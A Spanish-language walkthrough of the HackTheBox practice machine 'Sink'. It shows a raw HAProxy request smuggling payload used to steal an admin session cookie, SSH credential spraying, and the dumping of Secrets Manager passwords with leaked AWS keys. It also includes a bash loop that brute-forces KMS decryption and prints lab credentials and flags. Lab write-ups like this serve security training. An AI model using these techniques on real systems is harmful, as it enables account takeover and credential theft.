@@ -1,0 +1,598 @@
+---
+layout: post
+title: Sink
+date: 2023-06-15
+description:
+img:
+fig-caption:
+tags: [eWPT, eWPTXv2, OSWE]
+---
+___
+
+<center><img src="/writeups/assets/img/Sink-htb/Sink.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Abuso de HTTP Request Smuggling
+
+* Cookie Hijacking
+
+* Information Disclosure
+
+* Enumeración AWS
+
+* Abuso de secretos AWS
+
+* Enumeración Key Management AWS
+
+* Decrypt AWS KMS (Escalada de Privilegios)
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.225 -oG openports
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-15 09:52 GMT
+Nmap scan report for 10.10.10.225
+Host is up (0.065s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3000/tcp open  ppp
+5000/tcp open  upnp
+
+Nmap done: 1 IP address (1 host up) scanned in 11.75 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p22,3000,5000 10.10.10.225 -oN portscan
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-15 09:53 GMT
+Nmap scan report for 10.10.10.225
+Host is up (0.079s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+3000/tcp open  ppp?
+| fingerprint-strings: 
+|   GenericLines, Help: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: text/html; charset=UTF-8
+|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+|     Set-Cookie: i_like_gitea=4038888450bbe9ac; Path=/; HttpOnly
+|     Set-Cookie: _csrf=A3RgcK-Nve15TVHW7PafQRvxcWQ6MTY4NjgyMjgwNzUwMDk0NjM4MA; Path=/; Expires=Fri, 16 Jun 2023 09:53:27 GMT; HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Thu, 15 Jun 2023 09:53:27 GMT
+|     <!DOCTYPE html>
+|     <html lang="en-US" class="theme-">
+|     <head data-suburl="">
+|     <meta charset="utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <meta http-equiv="x-ua-compatible" content="ie=edge">
+|     <title> Gitea: Git with a cup of tea </title>
+|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
+|     <meta name="theme-color" content="#6cc644">
+|     <meta name="author" content="Gitea - Git with a cup of tea" />
+|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
+|   HTTPOptions: 
+|     HTTP/1.0 404 Not Found
+|     Content-Type: text/html; charset=UTF-8
+|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+|     Set-Cookie: i_like_gitea=52d8d7f197cb0b8a; Path=/; HttpOnly
+|     Set-Cookie: _csrf=Yqlt-JRCiFQnTs1C62SQVRsoKjo6MTY4NjgyMjgxMzIxNTQ0OTI2OA; Path=/; Expires=Fri, 16 Jun 2023 09:53:33 GMT; HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Thu, 15 Jun 2023 09:53:33 GMT
+|     <!DOCTYPE html>
+|     <html lang="en-US" class="theme-">
+|     <head data-suburl="">
+|     <meta charset="utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <meta http-equiv="x-ua-compatible" content="ie=edge">
+|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
+|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
+|     <meta name="theme-color" content="#6cc644">
+|     <meta name="author" content="Gitea - Git with a cup of tea" />
+|_    <meta name="description" content="Gitea (Git with a c
+5000/tcp open  http    Gunicorn 20.0.0
+|_http-title: Sink Devops
+|_http-server-header: gunicorn/20.0.0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.94%I=7%D=6/15%Time=648ADF98%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+SF:20Request")%r(GetRequest,2943,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
+SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
+SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=4038888450bbe9ac;
+SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=A3RgcK-Nve15TVHW7PafQRv
+SF:xcWQ6MTY4NjgyMjgwNzUwMDk0NjM4MA;\x20Path=/;\x20Expires=Fri,\x2016\x20Ju
+SF:n\x202023\x2009:53:27\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
+SF:IGIN\r\nDate:\x20Thu,\x2015\x20Jun\x202023\x2009:53:27\x20GMT\r\n\r\n<!
+SF:DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\">\n<head\x
+SF:20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=\"v
+SF:iewport\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\t<me
+SF:ta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<title>
+SF:\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20</title>\n\t<link
+SF:\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigin=\"use-c
+SF:redentials\">\n\t<meta\x20name=\"theme-color\"\x20content=\"#6cc644\">\
+SF:n\t<meta\x20name=\"author\"\x20content=\"Gitea\x20-\x20Git\x20with\x20a
+SF:\x20cup\x20of\x20tea\"\x20/>\n\t<meta\x20name=\"description\"\x20conten
+SF:t=\"Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pai
+SF:nless")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
+SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
+SF:ad\x20Request")%r(HTTPOptions,152E,"HTTP/1\.0\x20404\x20Not\x20Found\r\
+SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en
+SF:-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=52
+SF:d8d7f197cb0b8a;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=Yqlt-JRC
+SF:iFQnTs1C62SQVRsoKjo6MTY4NjgyMjgxMzIxNTQ0OTI2OA;\x20Path=/;\x20Expires=F
+SF:ri,\x2016\x20Jun\x202023\x2009:53:33\x20GMT;\x20HttpOnly\r\nX-Frame-Opt
+SF:ions:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2015\x20Jun\x202023\x2009:53:33\x
+SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
+SF:me-\">\n<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<m
+SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
+SF:ale=1\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edg
+SF:e\">\n\t<title>Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x
+SF:20a\x20cup\x20of\x20tea\x20</title>\n\t<link\x20rel=\"manifest\"\x20hre
+SF:f=\"/manifest\.json\"\x20crossorigin=\"use-credentials\">\n\t<meta\x20n
+SF:ame=\"theme-color\"\x20content=\"#6cc644\">\n\t<meta\x20name=\"author\"
+SF:\x20content=\"Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\"\x20/
+SF:>\n\t<meta\x20name=\"description\"\x20content=\"Gitea\x20\(Git\x20with\
+SF:x20a\x20c");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 97.98 seconds
+
+```
+
+## Puerto 3000,5000 (HTTP)
+
+Con ```whatweb``` analizo las tecnologías que emplea el servidor web
+
+```null
+whatweb http://10.10.10.225:3000
+http://10.10.10.225:3000 [200 OK] Cookies[_csrf,i_like_gitea,lang], Country[RESERVED][ZZ], HTML5, HttpOnly[_csrf,i_like_gitea], IP[10.10.10.225], JQuery, Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, Title[Gitea: Git with a cup of tea], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[ie=edge]
+```
+
+```null
+whatweb http://10.10.10.225:5000
+http://10.10.10.225:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn/20.0.0], IP[10.10.10.225], PasswordField[password], Script, Title[Sink Devops], UncommonHeaders[x-served-by], Via-Proxy[haproxy]
+```
+
+Se está empleando un ```Reverse Proxy``` llamado ```HaProxy```. Dentro del ```Gitea``` puedo ver varios usuarios
+
+<img src="/writeups/assets/img/Sink-htb/1.png" alt="">
+
+Pero ninguno de ellos tiene repositorios. Me puedo registrar en el puerto 5000
+
+<img src="/writeups/assets/img/Sink-htb/2.png" alt="">
+
+Me carga una interfaz de ```DevOps```
+
+<img src="/writeups/assets/img/Sink-htb/3.png" alt="">
+
+En una sección, puedo agregar notas
+
+<img src="/writeups/assets/img/Sink-htb/4.png" alt="">
+
+La intercepto con ```BurpSuite```. Una vez creada, aparecen otros dos campos
+
+<img src="/writeups/assets/img/Sink-htb/5.png" alt="">
+
+Puedo agregar comentarios
+
+<img src="/writeups/assets/img/Sink-htb/6.png" alt="">
+
+En este [artículo](https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks) explican como el ```Reverse PRoxy``` que se está empleando es vulnerable a ```HTTP request smuggling attacks```. Esto consiste en la capacidad de tramitar dos peticiones en la misma, abusando de una cabecera ```Transfer-Encoding: chunked```. Hay un [blog](https://nathandavison.com/blog/haproxy-http-request-smuggling) que detalla la vulnerabilidad en sí
+
+<img src="/writeups/assets/img/Sink-htb/7.png" alt="">
+
+Convierto el salto vertical a ```base64```
+
+```null
+echo '\x0b' | base64 -w 0
+Cwo=
+```
+
+Es importante que no se cuele ningún salto de línea al escribirlo. Para ello, desde el ```BurpSuite``` se le puede dar a la opción de ver caracteres especiales y eliminiarlo en caso de que exista
+
+<img src="/writeups/assets/img/Sink-htb/8.png" alt="">
+
+La petición final quedaría así:
+
+```null
+POST /comment HTTP/1.1
+Host: 10.10.10.225:5000
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 326
+Cookie: lang=en-US; i_like_gitea=bbf23eb1aaa41c49; _csrf=rwxcXk8EZ--wi21PJquipL1KYuQ6MTY4NjgyMzAwNzQ4NjIxMTU2MQ; session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.ZIrhfA.7RAcJg1F-VjZDcw11Nv5Uo6xtjQ
+Transfer-Encoding:chunked
+
+0
+
+POST /comment HTTP/1.1
+Host: 10.10.10.225:5000
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 2
+Cookie: lang=en-US; i_like_gitea=bbf23eb1aaa41c49; _csrf=rwxcXk8EZ--wi21PJquipL1KYuQ6MTY4NjgyMzAwNzQ4NjIxMTU2MQ; session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.ZIrhfA.7RAcJg1F-VjZDcw11Nv5Uo6xtjQ
+
+msg=test
+```
+
+Al envíar, se van a agregar dos comentarios
+
+<img src="/writeups/assets/img/Sink-htb/9.png" alt="">
+
+Modifico la longitud del mensaje
+
+```null
+msg=testttttttttttt
+```
+
+En función del ```Content-Type```, se van a mostrar más o menos caracteres. Si lo cambio a ```Content-Length: 9``` podré ver dos ```t``` en la respuesta
+
+<img src="/writeups/assets/img/Sink-htb/10.png" alt="">
+
+Incremento su valor a ```300```
+
+<img src="/writeups/assets/img/Sink-htb/11.png" alt="">
+
+Esta cookie de sesión no es la misma que la mía. La introduzco en mi navegador para hacer un ```Cookie Hijacking```
+
+<img src="/writeups/assets/img/Sink-htb/12.png" alt="">
+
+Estoy loggeado como usuario ```Administrador```
+
+<img src="/writeups/assets/img/Sink-htb/13.png" alt="">
+
+Tiene almacenadas tres notas
+
+<img src="/writeups/assets/img/Sink-htb/14.png" alt="">
+
+<img src="/writeups/assets/img/Sink-htb/15.png" alt="">
+
+<img src="/writeups/assets/img/Sink-htb/16.png" alt="">
+
+Las intento validar con ```crackmapexec``` pero está implementado un ```Firewall``` que impide la fuerza bruta
+
+```null
+rackmapexec ssh 10.10.10.225 -u users -p passwords
+SSH         10.10.10.225    22     10.10.10.225     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
+SSH         10.10.10.225    22     10.10.10.225     [-] chefadm:/6'fEGC&zEx{4]zz Authentication failed.
+SSH         10.10.10.225    22     10.10.10.225     [-] chefadm:FaH@3L>Z3})zzfQ3 Authentication failed.
+SSH         10.10.10.225    22     10.10.10.225     [-] chefadm:g8<H6GK\{*L.fB3C Authentication failed.
+SSH         10.10.10.225    22     10.10.10.225     [-] root:/6'fEGC&zEx{4]zz [Errno None] Unable to connect to port 22 on 10.10.10.225
+SSH         10.10.10.225    22     10.10.10.225     [-] root:FaH@3L>Z3})zzfQ3 [Errno None] Unable to connect to port 22 on 10.10.10.225
+SSH         10.10.10.225    22     10.10.10.225     [-] root:g8<H6GK\{*L.fB3C [Errno None] Unable to connect to port 22 on 10.10.10.225
+SSH         10.10.10.225    22     10.10.10.225     [-] nagios_adm:/6'fEGC&zEx{4]zz [Errno None] Unable to connect to port 22 on 10.10.10.225
+SSH         10.10.10.225    22     10.10.10.225     [-] nagios_adm:FaH@3L>Z3})zzfQ3 [Errno None] Unable to connect to port 22 on 10.10.10.225
+SSH         10.10.10.225    22     10.10.10.225     [-] nagios_adm:g8<H6GK\{*L.fB3C [Errno None] Unable to connect to port 22 on 10.10.10.225
+```
+
+Sin embargo, ```root:FaH@3L>Z3})zzfQ3``` es válido para el ```Gitea```. Tiene varios repositorios privados
+
+<img src="/writeups/assets/img/Sink-htb/17.png" alt="">
+
+Para ```Key_Management``` existe un commit donde se eliminó una clave de acceso por SSH
+
+<img src="/writeups/assets/img/Sink-htb/18.png" alt="">
+
+Es válida para el usuario ```marcus```. Puedo ver la primera flag
+
+```null
+ssh -i id_rsa marcus@10.10.10.225
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 15 Jun 2023 11:18:00 AM UTC
+
+  System load:                      0.17
+  Usage of /:                       38.2% of 17.59GB
+  Memory usage:                     57%
+  Swap usage:                       0%
+  Processes:                        302
+  Users logged in:                  0
+  IPv4 address for br-85739d6e29c0: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for ens160:          10.10.10.225
+  IPv6 address for ens160:          dead:beef::250:56ff:feb9:3f2a
+
+ * Introducing self-healing high availability clusters in MicroK8s.
+   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.
+
+     https://microk8s.io/high-availability
+
+197 updates can be installed immediately.
+115 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Wed Jan 27 12:14:16 2021 from 10.10.14.4
+marcus@sink:~$ cat user.txt 
+17a973607dd07cf84d75398f21885b4b
+```
+
+# Escalada
+
+Tengo varias intefaces asignadas
+
+```null
+marcus@sink:~$ hostname -I
+10.10.10.225 172.18.0.1 172.17.0.1 dead:beef::250:56ff:feb9:3f2a 
+```
+
+En la tabla ```ARP``` puedo ver varias ```IPs```
+
+
+Subo el ```pspy``` para detectar tareas que se ejecutan en intervalos regulares de tiempo
+
+```null
+2023/06/15 11:35:01 CMD: UID=0    PID=9864   | /usr/sbin/CRON -f 
+2023/06/15 11:35:01 CMD: UID=0    PID=9866   | /bin/sh -c /root/automation/sm.php 
+2023/06/15 11:35:01 CMD: UID=0    PID=9865   | /bin/sh -c /root/automation/sm.php 
+```
+
+Como de antes había visto que se está empleando un Firewall, voy a aplicar fuerza bruta al Gitea para ver me bloquea el servidor
+
+```null
+wfuzz -c -t 200 -z range,1-10000 http://10.10.10.225:3000/FUZZ
+```
+
+Capturo el comando de ```iptables```
+
+```null
+2023/06/15 11:37:00 CMD: UID=0    PID=10139  | /bin/sh -c iptables -w -I f2b-app 1 -s 10.10.16.6 -j REJECT --reject-with icmp-port-unreachable 
+```
+
+En el repositorio ```Log_Management``` se leakean la clave y secreto de ```AWS```
+
+<img src="/writeups/assets/img/Sink-htb/19.png" alt="">
+
+Me autentico en ```aws```
+
+```null
+marcus@sink:/tmp$ aws configure
+AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
+AWS Secret Access Key [None]: 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
+Default region name [None]: eu
+Default output format [None]: json
+```
+
+Y listo los secretos en formato ```JSON```
+
+```null
+marcus@sink:/tmp$ aws secretsmanager list-secrets --endpoint-url="http://127.0.0.1:4566"
+{
+    "SecretList": [
+        {
+            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-QIpEX",
+            "Name": "Jenkins Login",
+            "Description": "Master Server to manage release cycle 1",
+            "KmsKeyId": "",
+            "RotationEnabled": false,
+            "RotationLambdaARN": "",
+            "RotationRules": {
+                "AutomaticallyAfterDays": 0
+            },
+            "Tags": [],
+            "SecretVersionsToStages": {
+                "89b78be0-75fe-436f-97dd-b0c758f64109": [
+                    "AWSCURRENT"
+                ]
+            }
+        },
+        {
+            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-fsEeW",
+            "Name": "Sink Panel",
+            "Description": "A panel to manage the resources in the devnode",
+            "KmsKeyId": "",
+            "RotationEnabled": false,
+            "RotationLambdaARN": "",
+            "RotationRules": {
+                "AutomaticallyAfterDays": 0
+            },
+            "Tags": [],
+            "SecretVersionsToStages": {
+                "790e9f13-17c6-4d68-83b0-cb508bfc394a": [
+                    "AWSCURRENT"
+                ]
+            }
+        },
+        {
+            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-nBqFN",
+            "Name": "Jira Support",
+            "Description": "Manage customer issues",
+            "KmsKeyId": "",
+            "RotationEnabled": false,
+            "RotationLambdaARN": "",
+            "RotationRules": {
+                "AutomaticallyAfterDays": 0
+            },
+            "Tags": [],
+            "SecretVersionsToStages": {
+                "b5c457d3-c652-43bb-b7c4-c9866b26352f": [
+                    "AWSCURRENT"
+                ]
+            }
+        }
+    ]
+}
+```
+
+
+Me quedo con los identificadores
+
+```null
+marcus@sink:/tmp$ aws secretsmanager list-secrets --endpoint-url="http://127.0.0.1:4566" | grep "arn:aws" | grep -oP '".*?"' | grep -v ARN | tr -d '"'
+arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-QIpEX
+arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-fsEeW
+arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-nBqFN
+```
+
+Obtengo los datos para cada uno de ellos
+
+```null
+marcus@sink:/tmp$ aws secretsmanager get-secret-value --secret-id 'arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-QIpEX' --endpoint-url="http://127.0.0.1:4566"
+{
+    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-QIpEX",
+    "Name": "Jenkins Login",
+    "VersionId": "89b78be0-75fe-436f-97dd-b0c758f64109",
+    "SecretString": "{\"username\":\"john@sink.htb\",\"password\":\"R);\\)ShS99mZ~8j\"}",
+    "VersionStages": [
+        "AWSCURRENT"
+    ],
+    "CreatedDate": 1686822509
+}
+```
+
+```null
+marcus@sink:/tmp$ aws secretsmanager get-secret-value --secret-id 'arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-fsEeW' --endpoint-url="http://127.0.0.1:4566"
+{
+    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-fsEeW",
+    "Name": "Sink Panel",
+    "VersionId": "790e9f13-17c6-4d68-83b0-cb508bfc394a",
+    "SecretString": "{\"username\":\"albert@sink.htb\",\"password\":\"Welcome123!\"}",
+    "VersionStages": [
+        "AWSCURRENT"
+    ],
+    "CreatedDate": 1686822509
+}
+```
+
+```null
+marcus@sink:/tmp$ aws secretsmanager get-secret-value --secret-id 'arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-nBqFN' --endpoint-url="http://127.0.0.1:4566"
+{
+    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-nBqFN",
+    "Name": "Jira Support",
+    "VersionId": "b5c457d3-c652-43bb-b7c4-c9866b26352f",
+    "SecretString": "{\"username\":\"david@sink.htb\",\"password\":\"EALB=bcC=`a7f2#k\"}",
+    "VersionStages": [
+        "AWSCURRENT"
+    ],
+    "CreatedDate": 1686822509
+}
+```
+
+Gano acceso como ```david``` con la contraseña ```EALB=bcC=`a7f2#k```
+
+```null
+marcus@sink:/tmp$ su david
+Password: 
+david@sink:/tmp$ 
+```
+
+En su directorio personal, hay un directorio que contiene un archivo encriptado
+
+```null
+david@sink:~/Projects/Prod_Deployment$ file servers.enc 
+servers.enc: data
+```
+
+Listo las claves con ```aws```, pero antes volviendo a autenticarme con ```aws configure```
+
+```null
+david@sink:~/Projects/Prod_Deployment$ aws kms list-keys --endpoint-url="http://127.0.0.1:4566" | grep KeyId | awk NF'{print $NF}' | tr -d '",'
+0b539917-5eff-45b2-9fa1-e13f0d2c42ac
+16754494-4333-4f77-ad4c-d0b73d799939
+2378914f-ea22-47af-8b0c-8252ef09cd5f
+2bf9c582-eed7-482f-bfb6-2e4e7eb88b78
+53bb45ef-bf96-47b2-a423-74d9b89a297a
+804125db-bdf1-465a-a058-07fc87c0fad0
+837a2f6e-e64c-45bc-a7aa-efa56a550401
+881df7e3-fb6f-4c7b-9195-7f210e79e525
+c5217c17-5675-42f7-a6ec-b5aa9b9dbbde
+f0579746-10c3-4fd1-b2ab-f312a5a0f3fc
+f2358fef-e813-4c59-87c8-70e50f6d4f70
+```
+
+Creo un script en ```bash``` que se encargue de probar por todos los algoritmos posibles (Ver el panel de ayuda) para cada key de la lista
+
+```null
+david@sink:~/Projects/Prod_Deployment$ cat decrypter.sh 
+#!/bin/bash
+
+declare -a algorithms=(SYMMETRIC_DEFAULT RSAES_OAEP_SHA_1 RSAES_OAEP_SHA_256)
+
+for algorithm in ${algorithms[@]}; do
+	aws kms list-keys --endpoint-url="http://127.0.0.1:4566" | grep KeyId | awk NF'{print $NF}' | tr -d '",' | while read key_id; do
+		aws kms decrypt --endpoint-url="http://127.0.0.1:4566" --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc --key-id "$key_id" --encryption-algorithm $algorithm
+	done
+done
+```
+
+Al ejecutarlo, únicamente va a devolver el archivo desecriptado cuando todos los valores son correctos
+
+```null
+david@sink:~/Projects/Prod_Deployment$ ./decrypter.sh 2>/dev/null 
+{
+    "KeyId": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0",
+    "Plaintext": "H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=",
+    "EncryptionAlgorithm": "RSAES_OAEP_SHA_256"
+}
+```
+
+Almaceno la cadena en ```base64``` a un archivo
+
+```null
+echo "H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=" | base64 -d > file
+```
+
+En base a los ```Magic Numbers``` puedo detectar el formato
+
+```null
+file file
+file: gzip compressed data, from Unix, original size modulo 2^32 10240
+```
+
+Lo descomprimo
+
+```null
+tar -xf file
+```
+
+En el archivo ```servers.yml``` hay credenciales en texto plano
+
+```null
+cat servers.yml
+server:
+  listenaddr: ""
+  port: 80
+  hosts:
+    - certs.sink.htb
+    - vault.sink.htb
+defaultuser:
+  name: admin
+  pass: _uezduQ!EY5AHfe2
+
+```
+
+Se reutilizan para ```root```. Puedo ver la segunda flag
+
+```null
+david@sink:~/Projects/Prod_Deployment$ su root
+Password: 
+root@sink:/home/david/Projects/Prod_Deployment# cat /root/root.txt 
+4149bf6e3b6cf865309cce1db0a350f0
+```
